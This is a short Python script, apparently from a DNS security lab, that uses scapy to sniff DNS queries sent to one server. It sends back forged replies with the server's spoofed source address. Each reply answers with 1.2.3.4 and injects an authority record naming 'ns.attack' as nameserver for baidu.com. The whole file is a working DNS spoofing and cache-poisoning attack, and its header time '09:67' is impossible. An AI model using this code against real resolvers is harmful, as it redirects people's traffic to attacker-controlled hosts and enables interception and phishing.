#!/usr/bin/env python
# -*- encoding: utf-8 -*-
"""
@File    :   dns_authority.py
@Contact :   
@License :   (C)Copyright 2024

@Modify Time        @Author     @Version    @Description
----------------    --------    --------    -----------
25/9/2024 09:67     tochus      0.1         None
"""

from scapy.all import *
from scapy.layers.dns import DNS, DNSRR
from scapy.layers.inet import IP, UDP

DNS_SERVER_IP = "10.10.8.3"
PORT_OF_SERVER = "53"
BPF_FILTER = "udp port " + PORT_OF_SERVER + " and ip dst " + DNS_SERVER_IP


def dns_response(pkt):
    try:
        # A
        if DNS in pkt:
            print("%s : fm %s:%d : %s A ?" % (
                time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), pkt[IP].src, pkt[UDP].sport,
                pkt[DNS].qd.qname.decode("utf-8")))

            spf_resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) / UDP(sport=int(PORT_OF_SERVER), dport=pkt[UDP].sport)
            spf_resp /= DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
                            ancount=1, an=DNSRR(rrname=pkt[DNS].qd.qname, type=1, ttl=10, rdata="1.2.3.4"),
                            nscount=1, ns=DNSRR(rrname="baidu.com", type=2, ttl=60, rdata="ns.attack"))

            send(spf_resp)

            print("%s : to %s:%d : %s A %s" % (
                time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), pkt[IP].src, pkt[UDP].sport,
                pkt[DNS].qd.qname.decode("utf-8"), ""))

    except Exception as error:
        print("Error: ", error)


print("Start DNS Authority ...")
sniff(filter=BPF_FILTER, prn=dns_response)
